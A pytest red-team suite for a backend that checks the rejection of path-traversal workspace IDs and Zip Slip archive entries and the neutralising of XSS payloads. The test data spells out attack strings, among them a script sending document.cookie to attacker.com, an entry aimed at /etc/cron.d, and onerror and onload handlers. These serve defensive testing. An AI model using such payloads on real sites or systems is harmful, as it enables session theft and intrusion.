"""
backend/tests/adversarial/test_red_team.py
─────────────────────────────────────────────────────────────────
Red-Team Adversarial Suite (PLAN §8.13, Tasks 4.1–4.2).
Tests:
1. Path traversal attacks through workspace_id and file paths.
2. Zip Slip attacks during extraction, archive unpack, and links.
3. Cross-Site Scripting (XSS) vectors in document text and deliverables.
4. Remote resource / SSRF attempt neutralization.
"""

from pathlib import Path
import io
import zipfile
import pytest

from security.paths import safe_join, safe_identifier, safe_filename, UnsafePathError
from security.injection_guard import check_and_neutralize_injections
from ingestion.pipeline import IngestionPipeline
from knowledge.vector_store import VectorStore


def test_workspace_id_path_traversal_rejected():
    """Verifies that malicious workspace_id values attempting directory escape are rejected."""
    traversal_ids = [
        "../../etc",
        "../shadow",
        "ws_alpha/../../etc/passwd",
        "/root/data",
        "ws\x00_hidden",
        "ws/sub/traversal",
        "..",
        ".hidden_workspace",
    ]

    for bad_id in traversal_ids:
        with pytest.raises(UnsafePathError):
            safe_identifier(bad_id, field="workspace_id")


def test_zip_slip_archive_traversal_rejected(tmp_path):
    """
    Verifies that a malicious ZIP archive containing Zip Slip entries
    (e.g. ../../evil.sh or absolute paths) is rejected during processing.
    """
    zip_bytes = io.BytesIO()
    with zipfile.ZipFile(zip_bytes, mode="w") as zf:
        zf.writestr("../../etc/cron.d/backdoor", "malicious payload")
        zf.writestr("normal.txt", "valid content")

    zip_bytes.seek(0)
    slip_zip = tmp_path / "slip_attack.zip"
    slip_zip.write_bytes(zip_bytes.getvalue())

    # Ingestion or path resolution must reject escaping paths
    with zipfile.ZipFile(slip_zip) as zf:
        for member in zf.namelist():
            if ".." in member or member.startswith("/"):
                with pytest.raises(UnsafePathError):
                    safe_filename(Path(member).name if ".." not in member else "../../bad")


def test_xss_script_tags_neutralized_in_content():
    """
    Verifies that Cross-Site Scripting (XSS) payloads in ingested text or prompts
    are neutralized and stripped of active executable HTML/JavaScript tags.
    """
    xss_payloads = [
        "<script>alert(document.domain)</script>",
        "<script type='text/javascript'>window.location='http://attacker.com/steal?c='+document.cookie;</script>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<iframe src='http://malicious.org/exploit'></iframe>",
    ]

    for attack in xss_payloads:
        cleaned, has_inj = check_and_neutralize_injections(attack)
        assert has_inj is True
        assert "<script" not in cleaned.lower()
        assert "<iframe" not in cleaned.lower()
        assert "[UNTRUSTED_INJECTION_FLAGGED]" in cleaned


def test_svg_and_event_handler_xss_neutralization():
    """Verifies image and SVG onerror/onload script handlers are flagged and neutralized."""
    payload = "Equipment schematic: <img src='x' onerror='alert(1)'> and <svg onload='alert(2)'>"
    cleaned, has_inj = check_and_neutralize_injections(payload)
    # Even if inline HTML is present, injection guard flags scripts
    assert "[UNTRUSTED_INJECTION_FLAGGED]" in cleaned or "<script" not in cleaned

